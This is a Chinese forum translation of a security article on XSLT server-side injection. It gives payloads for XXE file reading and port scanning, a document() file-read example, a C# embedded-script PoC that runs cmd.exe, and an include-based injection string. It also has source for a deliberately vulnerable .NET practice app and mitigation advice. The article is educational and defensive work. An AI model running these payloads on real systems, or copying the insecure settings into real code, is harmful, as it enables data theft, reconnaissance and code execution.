<pre class="brush:python;toolbar:false">Microsoft
</pre><h2><a name="" class="anchor" href=""><span class="header-link"></span></a>使用 XML 外部实体(XXE)窃取信息、扫描端口</h2><p>由于 XSLT 所使用的文件格式是 XML ，那么常见的针对 XML 的攻击，例如十亿笑攻击(也称 XML 炸弹)和 XML 外部实体攻击，也会影响到 XSLT 就不足为奇了。十亿笑攻击是一种拒绝服务攻击，其目的在于耗尽服务器的内存资源。为了更契合主题，本文采用的是 XML 外部实体攻击。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>在下面的例子中，我们使用了一个外部实体读取 "C:\secretfruit.txt" 文件中的内容。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    Fruits &amp;ext_file;:
    &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;

&lt;/xsl:stylesheet&gt;
</pre><p>ENTITY 元素放置的是 "ext_file" 所引用的文件中的内容，也就是我们接下来使用语法 "&amp;ext_file" 打印到主文档中的内容。从输出结果可以看出该文件中的秘密内容就是 "Golden Apple" :</p>
<pre class="brush:python;toolbar:false">Fruits Golden Apple:

      - Lemon: Yellow and sour
      - Watermelon: Round, green outside, red inside
</pre><p>这项技术可被用来取出存储在 Web 服务器上的文件，或者那些正常情况下攻击者无法访问的内部网络的网页，而这些文件有可能是包含身份信息的配置文件或者包含其他敏感信息的文件。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>对于那些可以从受害者内部网络中的其他系统中取出的文件，攻击者也可以使用 <a href="https://baike.baidu.com/item/UNC%E8%B7%AF%E5%BE%84/3231808">UNC 路径</a> {\\servername\share\file} 或者 URL {<a href="http://servername/file%7D">http://servername/file}</a> 来代替文件路径。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>使用一些 IP 地址和端口号或许还能查出一个远程端口是打开状态还是关闭状态，不过这一点取决于应用是如何应答的，比方说应用可以返回不同种类的错误信息或者在应答中显示时延信息。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>下面的 XSLT 文档使用了 URL <a href="http://172.16.132.1:25">http://172.16.132.1:25</a> ：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    Fruits &amp;ext_file;:
    &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;

&lt;/xsl:stylesheet&gt;
</pre><p>下图展示了当我们试图连接到该 URL 时，应用返回的错误信息。透过该错误信息不难推断出25号端口处于关闭状态。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="https://bbs.kanxue.com/upload/attach/201711/747240_f4oda7u8tnsvq2q.png" style="max-width:100%;" alt="" /></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>当我们使用 <a href="http://172.16.132.1:1234">http://172.16.132.1:1234</a> 时，应用返回了不同的错误信息，透过该错误信息可以推断出1234号端口处于打开状态。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="https://bbs.kanxue.com/upload/attach/201711/747240_35na068cp3lq5m8.png" style="max-width:100%;" alt="" /></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>攻击者可以使用这种技术对受害者的内部网络进行侦察扫描。</p>
<h2><a name="" class="anchor" href=""><span class="header-link"></span></a>使用 document() 函数窃取信息、扫描端口</h2><p>document() 函数赋予了 XSLT 文档访问外部 XML 文档中除了主数据源之外的数据的能力。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>通过将所有内容复制到转换结果中，该函数可以被滥用于读取远程系统上的文件。被读取的文件需要是一个格式正确的 XML 文档，但这基本上不算问题，因为敏感信息通常就是被存储在 XML 文件中。例如 ASP .NET Web 应用中的 web.config 文件就是一个很好的目标，因为该文件可能包含了数据库证书。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>看一个例子。下面的 XSLT 文档可用于窃取 "C:\secrectfruit.xml" 文件中的内容：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    &lt;xsl:copy-of select="document('C:\secretfruit.xml')"/&gt;
    Fruits:
        &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>转换结果在顶部显示了该秘密文件中的内容。</p>
<pre class="brush:python;toolbar:false">&lt;fruits&gt;
  &lt;fruit&gt;
    &lt;name&gt;Golden Apple&lt;/name&gt;
    &lt;description&gt;Round, made of Gold&lt;/description&gt;
  &lt;/fruit&gt;
&lt;/fruits&gt;
    Fruits:

      - Lemon: Yellow and sour
      - Watermelon: Round, green outside, red inside
</pre><p>与 XXE 攻击类似，document() 函数可被用于取出远程系统中的文档，也可使用 UNC 路径或者 URL 进行简单的端口扫描。下面是一个使用 URL 执行端口扫描的 XSLT 文档：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    &lt;xsl:copy-of select="document('http://172.16.132.1:25')"/&gt;
    Fruits:
        &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><h2><a name="使用嵌入式脚本块进行远程代码执行" class="anchor" href="#%E4%BD%BF%E7%94%A8%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%84%9A%E6%9C%AC%E5%9D%97%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="header-link"></span></a>使用嵌入式脚本块进行远程代码执行</h2><p>嵌入式脚本块属于专有 XSLT 扩展的功能，允许将代码直接包含在 XSLT 文档中。例如在微软的实现中，可以包含 C# 代码。当文档被解析后，包含在其中的代码会被远程服务器编译运行。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>下面这个 XSLT 文档就是一个 <a href="http://www.baike.com/wiki/POC">PoC</a> ，功能为列出当前工作目录下所有文件。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts"&gt;

&lt;msxsl:script language = "C#" implements-prefix = "user"&gt;
&lt;![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]&gt;
&lt;/msxsl:script&gt;

  &lt;xsl:template match="/fruits"&gt;
  --- BEGIN COMMAND OUTPUT ---
    &lt;xsl:value-of select="user:execute()"/&gt;
  --- END COMMAND OUTPUT ---    
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>首先我们在 "xsl:stylesheet" 标签中定义了两个新的 XML 前缀。第一个 "xmlns:msxsl" 启用了微软的专有架构扩展，第二个 "xmlns:user" 声明了一个通过 "msxsl:script" 脚本块实现的用户自定义扩展。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>上述 C# 代码实现了一个 execute() 函数，该函数先执行了命令"cmd.exe /c dir"，然后以字符串的形式返回了该命令的输出。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>最后该函数在"xsl:value-of"标签中被调用。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>上述转换的结果其实与在 Windows 命令行中使用命令 "dir" 的输出一模一样。</p>
<pre class="brush:python;toolbar:false">--- BEGIN COMMAND OUTPUT ---
         Volume in drive C has no label.
 Volume Serial Number is EC7C-74AD

 Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole
Application\XsltConsoleApplication\bin\Debug

22/02/2017  15:19    &lt;DIR&gt;          .
22/02/2017  15:19    &lt;DIR&gt;          ..
22/02/2017  13:30               258 data.xml
22/02/2017  14:48               233 external_transform.xslt
22/02/2017  15:15                12 secretfruit.txt
31/01/2017  13:45               154 secretfruit.xml
22/02/2017  15:29               831 transform.xslt
22/02/2017  13:49             7,168 XsltConsoleApplication.exe
26/01/2017  15:42               189 XsltConsoleApplication.exe.config
22/02/2017  13:49            11,776 XsltConsoleApplication.pdb
               8 File(s)         20,621 bytes
               2 Dir(s)   9,983,107,072 bytes free

  --- END COMMAND OUTPUT ---
</pre><h2><a name="" class="anchor" href=""><span class="header-link"></span></a>江湖救急：import 、include</h2><p>import 和 include 标签可被用于关联多个 XSLT 文档。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>如果我们遇到了这样的情况：只能在 XSLT 文档中间部分注入。这样一来，便不能直接使用 XML 外部实体攻击或者嵌入式脚本块了，因为这两者都需要注入点在文件的最顶端。此时，import 和 include 便可用来克服此类限制，具体来讲就是给该 XSLT 文档关联一个外部文档。当外部文档被加载后，整个文档会被解析，如果攻击者可以控制这个外部文档，那他们就可以在该外部文档中使用 XML 外部实体或嵌入式脚本了。这个外部文档可以是提前上传到服务器的文件，也可以是一个使用 URL 引用的位于攻击者电脑上的文件，只要文件内容是 XML 即可。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>值得注意的是，"xsl:import" 标签只能作为 "xsl:stylesheet" 标签的第一个孩子使用，但是 "xsl:include" 标签则没有此限制。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>此处使用了与之前一模一样的 XSLT 文档，同时假设我们只能在字符串 "Your Company Name Here" 这里注入。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version=”1.0” encoding=”utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    Your Company Name Here
    Fruits:
        &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
  &lt;xsl:include href="external_transform.xslt"/&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>我们想要关联下面名为 "external_transform.xslt" 的外部 XSLT 文档。为了简化问题，此处该外部文档只是简单地打印了一条消息。但是值得一提的是，该外部文档可以替换为前面已经介绍过任意一个 XSLT 文档，包括那些需要在文件最顶部声明的文档，比如那个不能在此处直接使用的包含了嵌入式脚本块的文档。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
    &lt;xsl:template match="/"&gt;
     Hello from the external transformation
    &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>为了包含外部文档，我们需要插入以下标签。</p>
<pre class="brush:python;toolbar:false">&lt;xsl:include href="external_transform.xslt"/&gt;
</pre><p>但是这里有个问题，那就是 "xsl:include"标签不能被包含在 "xsl:template" 标签之内，同时插入 include 标签的文件还必须是一个格式正确的 XML 文件。所以，第一步我们要做的就是关闭 "xsl:template" 标签，然后我们才能插入 "xsl:include" 标签，这样就满足了第一个条件。但是为了满足第二个条件，我们又需要在插入 "xsl:include" 标签之后重新打开 "xsl:template" 标签。于是最后的结果变成了这个样子：</p>
<pre class="brush:python;toolbar:false">&lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;
</pre><p>完成注入后，最终 XSLT 文档差不多如下：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    &lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;
    Fruits:
    &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
  &lt;xsl:include href="external_transform.xslt"/&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>转换执行后会产生如下输出：</p>
<pre class="brush:python;toolbar:false">Hello from the external transformation
</pre><p><br /></p>
<h1><a name="" class="anchor" href=""><span class="header-link"></span></a>一个易受 XSLT 攻击的 APP</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>XSLT 漏洞到此已经介绍完毕，但是想要写出一个在实际情景中能够奏效的利用漏洞的  XSLT 文档可能并不如想象中的那般容易，一方面因为要严格符合 XML 的语法规范，另一方面是因为我们往往不能把握应用的实现细节。你可能在想，要是有个现成的应用让我练练手那该多好啊！</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>为此，我写了个小型的易受攻击的 .NET 控制台应用，可用于对其前面我们所介绍的攻击进行练习。该应用使用了 .NET 的 System.Xml 实现。源码已经贴在下面了，请使用微软的 Visual Studio 编译。源码和编译好的应用也可从<a href="https://github.com/ctxis/VulnerableXsltConsoleApplication">这里</a>下载。</p>
<pre class="brush:python;toolbar:false">using System;
using System.Xml;
using System.Xml.Xsl;

namespace XsltConsoleApplication
{
    class Program
    {
        /*
        This code contains serious vulnerabilities and is provided for training purposes only!
        DO NOT USE ANYWHERE FOR ANYTHING ELSE!!!
        */
        static void Main(string[] args)
        {
            Console.WriteLine("\n#####################################################################");
            Console.WriteLine("#                                                                   #");
            Console.WriteLine("# This is a Vulnerable-by-Design application to test XSLT Injection #");
            Console.WriteLine("#                                                                   #");
            Console.WriteLine("#####################################################################\n");
            Console.WriteLine("The application expects (in the current working directory):");
            Console.WriteLine(" - an XML file (data.xml) and\n - an XSLT style sheet (transform.xslt)\n");
            Console.WriteLine("===================================================================");

            String transformationXsltFileURI = "transform.xslt";
            String dataXMLFileURI = "data.xml";

            // Enable DTD processing to load external XML entities for both the XML and XSLT file
            XmlReaderSettings vulnerableXmlReaderSettings = new XmlReaderSettings();
            vulnerableXmlReaderSettings.DtdProcessing = DtdProcessing.Parse;
            vulnerableXmlReaderSettings.XmlResolver = new XmlUrlResolver();
            XmlReader vulnerableXsltReader = XmlReader.Create(transformationXsltFileURI, vulnerableXmlReaderSettings);
            XmlReader vulnerableXmlReader = XmlReader.Create(dataXMLFileURI, vulnerableXmlReaderSettings);

            XsltSettings vulnerableSettings = new XsltSettings();
            // Embedded script blocks and the document() function are NOT enabled by default
            vulnerableSettings.EnableDocumentFunction = true;
            vulnerableSettings.EnableScript = true;
            // A vulnerable settings class can also be created with:
            // vulnerableSettings = XsltSettings.TrustedXslt;

            XslCompiledTransform vulnerableTransformation = new XslCompiledTransform();
            // XmlUrlResolver is the default resolver for XML and XSLT and supports the file: and http: protocols
            XmlUrlResolver vulnerableResolver = new XmlUrlResolver();
            vulnerableTransformation.Load(vulnerableXsltReader, vulnerableSettings, vulnerableResolver);  

            XmlWriter output = new XmlTextWriter(Console.Out);

            // Run the transformation
            vulnerableTransformation.Transform(vulnerableXmlReader, output);   

        }
    }
}
</pre><p>请确保你在当前工作目录下使用了名为 data.xml 和 transformation.xslt 的文件(请查看源码相应片段)。<br /><br /></p>
<h1><a name="小小的建议" class="anchor" href="#%E5%B0%8F%E5%B0%8F%E7%9A%84%E5%BB%BA%E8%AE%AE"><span class="header-link"></span></a>小小的建议</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>如果你的应用中使用了 XSLT ，或许你可以从下面的指南中学到一些规避 XSLT 漏洞的方法。</p>
<ul>
<li><p>尽可能避免使用用户所提供的 XSLT 文档。</p>
</li>
<li><p>不要使用不可信的输入来生成 XSLT 文档，例如连接字符串。如果必须要使用非静态值，则应将其包含在 XML 数据文件中，并且只能由 XSLT 文档引用。</p>
</li>
<li><p>手动关闭正在使用的 XSLT 库中所提供的一些有风险的功能，因为库的默认设置一般都不太安全。查查库手册学习一下如何关闭那些有风险的功能，例如：XML外部实体、document{} 函数、import 和 include 标签。确保禁用了嵌入式脚本扩展，还有一些专有扩展所提供的允许读写外部文件的功能。</p>
</li>
</ul>
<p>推荐大家看一下这篇文章 <a href="https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf">XSLT Processing Security and Server Side Request Forgeries</a> ，作者是 Emanuel Duss 和 Roland Bischofberger 。这篇文章对于流行的 XSLT 库所实现的功能和每个库的默认设置做了一个很好的梳理，第34页还包含了一个对新手很友好的功能对比表格。<br /><br /></p>
<h1><a name="总结" class="anchor" href="#%E6%80%BB%E7%BB%93"><span class="header-link"></span></a>总结</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>XSLT 作为一个强大的工具被众多应用所使用，但是其脆弱的一面并不广为人知。一份糟糕的代码中很有可能隐藏了可被攻击者用来控制应用或窃取数据的漏洞。本文旨在通过展示一些可能受到的攻击来提高大家对于 XSLT 的认识，同时提供了一点指引帮助大家避免中招一些写代码时比较常见的陷阱。<br /><br /><br />原文链接：<a href="https://www.contextis.com/blog/xslt-server-side-injection-attacks">XSLT Server Side Injection Attacks</a><br />本文由 看雪翻译小组 hesir 编译<br />转载请注明来源</p>							
<br>
<p><a target="_blank" href="https://bbs.kanxue.com/thread-276361.htm"  >[2023春季班]2023，新的征程，脱壳机更新、iOS/eBPF、赠送云手机套装！一块裸板虚拟化五个容器云手机！3月25日起同时上调价格并赠送新设备！</a></p>

<div class="my-3">
	</div>					


							
														

													</div>

						<div>
													</div>

						<div style="height: 33px; line-height: 33px; border-top: 1px solid #ddd;">
																				</div>
					</div>
				</div>

				<div id="collection_thumb" style="text-align:center;padding:5px 0px 30px; margin-bottom: 1rem;">
					<div style="width:auto;display:inline-block;">

						<div class="card_collection" style=" height: 65px;line-height:30px">
							<div>
																<a href="javascript:void(0);" class="d-inline-block favorite"
									style="border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px;line-height: 40px;">
									<i class="icon-star-o color4A4A4A"></i>
								</a>
															</div>
							<div>
								收藏
								<span class="likes_box likes_box_hide" style="font-size: 13px;color: #0099ee;">・<span
										class="likes">2</span></span>
							</div>
						</div>
						<div class="card_collection" style=" height: 65px;line-height:30px">
							<div>
																<a href="javascript:void(0);" class="d-inline-block thumb"
									style="border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px;line-height: 40px;">
									<i class="icon-thumbs-o-up color4A4A4A"></i>
								</a>
								
							</div>
							<div>
								点赞<span class="thumbs_num_box" style="font-size: 13px;color: #0099ee;">・<span
										class="thumbs_num">1</span></span>
							</div>

						</div>
						<div class="card_collection" style=" height: 65px;line-height:30px">
							<div>
								<a href="javascript:void(0);" class="modal-title d-inline-block" id="exampleModalLabel"
									style="border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px;line-height: 40px;"
									data-toggle="modal" data-target=".reward">
									<i class="icon-rmb color4A4A4A"></i>
								</a>
							</div>
							<div>
								打赏
							</div>
						</div>
						<div class="card_collection position-relative" style=" height: 65px;line-height:30px">
							<div class="bbsshare_btn" style="cursor: pointer;">
								<div>
									<a href="javascript:void(0);" class="modal-title d-inline-block"
										style="border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px; line-height: 40px;">
										<i class="icon-share color4A4A4A"></i>
									</a>
								</div>
								<div>
									分享
								</div>
							</div>
							<div class="bd-bbsshare-modal-sm bbsshare_modal bg-white"
								style="display: none; width: 146px; box-shadow: 0 0 3px 0.5px #eee;">
								<div class="px-2 py-4">
									<div class="text-center" style="color: #5C5C5C;"><i class="icon icon-wechat "></i> 分享到微信
									</div>
									<div class="wechat_img py-2">
										<img src="https://bbs.kanxue.com/bbs_qrcode-http_3A_2F_2Fbbs_2epediy_2ecom_2Fthread_2d222921_2ehtm.htm"
											style="width: 100%;">
									</div>
									<div onclick="shareTo('qq')" class="text-center"
										style="color: #5C5C5C; cursor: pointer;"><i class="icon icon-qq"></i> 分享到QQ</div>
									<!-- <div class="text-center" style="color: #5C5C5C; cursor: pointer;"><i class="icon icon-wechat"></i> 分享到空间</div> -->
									<div onclick="shareTo('sina')" class="text-center"
										style="color: #5C5C5C; cursor: pointer;"><i class="icon icon-weibo"></i> 分享到微博</div>

								</div>
							</div>
						</div>

					</div>
				</div>
			</div>
			                
                
                <!--赞赏支持-->
                <div class="modal fade reward" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                        <div class="modal-dialog" role="document">
                                <div class="modal-content">
                                        <div class="modal-header">
                                            <h4 class="modal-title" id="exampleModalLabel">赞赏</h4>
                                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                    <span aria-hidden="true">&times;</span>
                                            </button>
                                        </div>
                                        <form action="" method="post" id="pay_kx" onsubmit="return topay()">
                                                <div class="modal-body ">
                                                        <div class="form-group mb-0">
                                                                <input name="ureward" type="hidden" value="747240" />
                                                                <input type="hidden" name="reward_articleid" value="222921" />
                                                                <div class="mb-3 text-center">
                                                                    <img src="https://bbs.kanxue.com/view/img/dashang.png" class="avatar-3" alt="100" />
                                                                </div>
                                                                
                                                                <div class="text-center mb-3">
                                                                    <div data-toggle="buttons">
                                                                        <label class="btn btn-outline-danger active" style="width:120px">
                                                                            <input type="radio" class="d-none" value="1" name="reward_rmbs" id="option1" autocomplete="off" checked>1 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="5" name="reward_rmbs" id="option3" autocomplete="off">5 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="10" name="reward_rmbs" id="option4" autocomplete="off">10 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="20" name="reward_rmbs" id="option5" autocomplete="off">20 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="50" name="reward_rmbs" id="option6" autocomplete="off">50 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="80" name="reward_rmbs" id="option6" autocomplete="off">80 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="100" name="reward_rmbs" id="option7" autocomplete="off">100 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="150" name="reward_rmbs" id="option7" autocomplete="off">150 雪花
                                                                        </label>
                                                                        <label class="btn btn-outline-danger" style="width:120px">
                                                                            <input type="radio" class="d-none" value="200" name="reward_rmbs" id="option8" autocomplete="off">200 雪花
                                                                        </label>
                                                                    </div>
                                                                </div>

                                                                <div>
                                                                    <label id="alipay_lab">
                                                                        <span>支付方式：</span>
                                                                        <input type="radio" value="1" checked="checked" name="reward_type" style="display:inline" />
                                                                        <span class="alipay-bg"></span>
                                                                    </label>
                                                                    <label class="ml-3">
                                                                        <input type="radio" value="3" name="reward_type">
                                                                        <i class="icon icon-weixin" style="font-size:17px;color:#49BE38"></i> 微信支付
                                                                    </label>
                                                                                                                                    </div>
                                                        </div>
                                                </div>
                                                <div class="px-3 mb-3">
                                                    <div class="mb-2">赞赏留言：
                                                        <select class="form-control form-control-sm reward_reason d-inline-block" style="max-width: 90px;">
                                                            <option value=0>快捷留言</option>
                                                            <option value="感谢分享～">感谢分享～</option>
                                                            <option value="精品文章～">精品文章～</option>
                                                            <option value="原创内容～">原创内容～</option>
                                                            <option value="精彩转帖～">精彩转帖～</option>
                                                            <option value="助人为乐～">助人为乐～</option>
                                                            
                                                        </select>
                                                    </div>
                                                    <textarea class="form-control reward_reason_textarea" name="brief" rows="1"></textarea>
                                                    
                                                </div>
                                                <div class="modal-footer">
                                                        <button id="pay_submit" type="submit" class="btn btn-primary btn-pay kx-pay" data-loading-text="正在提交...">立即支付</button>
                                                </div>
                                        </form>
                                </div>
                        </div>
                </div>			<div class="card p-1">
				<div class="card-body">
					<table class="table postlist mb-0">
						<thead>
							<tr>
								<th colspan="2" class="pa-0  pb-1">
									<dl class="row">
										<dt>
											<b>最新回复</b> (<span
												class="posts">0</span>)
										</dt>
										<dd style="text-align: right;">
											

											
										</dd>
									</dl>
								</th>
							</tr>
						</thead>
						<tbody>

															
				
								
				
														<tr class="post">
								<td class="td-avatar" aria-hidden="true">
									<a href="https://bbs.kanxue.com/user-705338.htm" aria-hidden="true" tabindex="-1">
										<img class="avatar-3" src="https://bbs.kanxue.com/view/img/avatar.png">
									</a>
								</td>
								<td class="p-l-0">
									<form action="" method="post" id="quick_reply_form">

										<dl class="row small text-muted">
											<dt class="username">游客</dt>
											<dd class="text-right text-grey"></dd>
										</dl>
										<div class="message mt-1">
											<div style=" border-radius: 0.25rem; border: 1px solid #ced4da;">
												<div class="text-center small py-3">
													<a href="https://passport.kanxue.com/user-login.htm"
														class="small">登录</a>&nbsp;|&nbsp;<a
														href="https://passport.kanxue.com/user-mobile.htm"
														class="small">注册</a>&nbsp;方可回帖
												</div>
											</div>
										</div>
										<div class="text-muted mt-3 small face_open">
											<dl class="row">
												<dt>
													<a class="btn btn-primary btn-sm"
														href="https://passport.kanxue.com/user-login.htm"
														role="button">　回帖　</a>

													<span class="emotion ml-3">表情</span>
													<span class="ml-3 d-none d-lg-inline-block"><a
															href="https://bbs.pediy.com/thread-247709.htm" target="_bank"
															style="color: #0099ee;">雪币赚取及消费</a></span>
												</dt>
												<dd class="text-right vtop">

													<a class="icon-mail-reply text-muted"
														href="https://passport.kanxue.com/user-login.htm"
														id="advanced_reply"> 高级回复</a>

												</dd>
											</dl>
										</div>
									</form>
								</td>
							</tr>
													</tbody>
					</table>
				</div>
			</div>
			

					
			
			
			
			<a role="button" class="btn btn-secondary btn-block xn-back my-3 mx-auto" style="max-width: 50%;"
				href="javascript:history.back();">返回</a>
		</div>
	</div>
	<div class="col-3 pr-0 hidden-sm hidden-md" style="padding-left: 15px;">
		<div class="right_content positionSticky position-sticky" style="top:0;">
			<div class="rightbox_card_hidden">
				<div class="card mb-3 position-relative ">
					<div class="py-4 px-4">
						<div class="row mx-0">
							<div>
								<!-- <a class="d-inline-block position-relative photo_frame photo_frame_image2" href="user-home-747240.htm" aria-hidden="true" tabindex="-1"> -->
								<a class="d-inline-block position-relative avatar_box" data-uid="747240" href="https://bbs.kanxue.com/user-home-747240.htm" aria-hidden="true" tabindex="-1">
									<img src="https://passport.kanxue.com/upload/avatar/240/747240.png?1502630198" style="width: 5rem; height:  5rem; border-radius: 5rem;">
								</a>
							</div>
							
							<div class="col pr-0">
								<div>
									<span style="font-size: 16px;" class="font-weight-bold">
										<a class="username_box" data-uid="747240" href="https://bbs.kanxue.com/user-home-747240.htm">hesir</a>
									</span>
																		<div class="d-inline-block"
										style="font-size: 1rem; transform:scale(.8); -ms-transform:scale(.8); -webkit-transform:scale(.8);">
										<a href="https://bbs.kanxue.com/user-747240-1-1.htm">
											<span class="icon-diamond text-danger" title="精华数"></span>
											<span class="font-weight-bold text-danger">
												1</span>
										</a>
									</div>
																	</div>
								<div class="mt-1">
									<span class="huoyue_num iconfont icon-a-5"></span>
									
									<a href="https://bbs.kanxue.com/thread-260144.htm" class="text-muted">
										<svg class="icon" aria-hidden="true">
											<use xlink:href="#icon-group_109">
											</use>
										</svg>
									</a>
									<img src="https://bbs.kanxue.com/view/img/stars03.gif"
										alt="">
								</div>
								<div class="mt-1">
